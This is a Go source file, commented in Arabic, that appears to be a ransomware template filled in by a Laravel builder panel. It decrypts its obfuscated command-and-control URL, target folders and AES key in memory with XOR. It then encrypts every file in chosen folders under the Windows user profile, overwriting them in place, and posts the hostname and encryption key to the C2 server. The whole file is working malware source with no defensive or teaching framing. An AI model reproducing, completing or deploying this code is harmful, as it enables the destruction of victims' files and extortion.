package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"net/url"
)

// المتغيرات المشفرة (يتم استبدالها من Laravel)
var EncC2ServerUrl = __C2_SERVER_URL__
var EncTargetDirs = __TARGET_DIRECTORIES__
var EncAesKey = __ENCRYPTED_AES_KEY__

// مفتاح فك تشفير XOR
const XorKey byte = __XOR_KEY__

// دالة فك تشفير XOR في الذاكرة
func decryptXOR(encrypted []byte, key byte) string {
	decrypted := make([]byte, len(encrypted))
	for i := 0; i < len(encrypted); i++ {
		decrypted[i] = encrypted[i] ^ key
	}
	return string(decrypted)
}

// دالة تشفير الملفات (AES)
func encryptData(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plainText, nil), nil
}

// معالجة الملفات
func processFiles(targetDirsString string, aesKey []byte) {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		userProfile = "C:\\Users\\Default"
	}

	targetDirectories := strings.Split(targetDirsString, ",")

	for _, dirName := range targetDirectories {
		dirName = strings.TrimSpace(dirName)
		if dirName == "" {
			continue
		}

		targetDir := filepath.Join(userProfile, dirName)
		if _, err := os.Stat(targetDir); err == nil {
			filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}
				
				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}

				encrypted, err := encryptData(data, aesKey)
				if err == nil {
					os.WriteFile(path, encrypted, 0644)
				}
				return nil
			})
		}
	}
}

// إرسال التقرير
func reportBack(c2Url string, aesKey string) {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "Unknown-PC"
	}

	data := url.Values{}
	data.Set("hostname", hostname)
	data.Set("ip_address", "192.168.1.100")
	data.Set("os", "Windows")
	data.Set("encryption_key", aesKey)
	data.Set("encryption_type", "AES")
	data.Set("status", "encrypted")

	resp, err := http.PostForm(c2Url, data)
	if err == nil {
		resp.Body.Close()
	}
}

func main() {
	// فك تشفير النصوص في الذاكرة
	realC2Url := decryptXOR(EncC2ServerUrl, XorKey)
	realTargetDirs := decryptXOR(EncTargetDirs, XorKey)
	realAesKeyStr := decryptXOR(EncAesKey, XorKey)

	// تحويل مفتاح AES إلى بايتات
	aesKeyBytes := []byte(realAesKeyStr)

	// تنفيذ المهام
	processFiles(realTargetDirs, aesKeyBytes)
	reportBack(realC2Url, realAesKeyStr)
}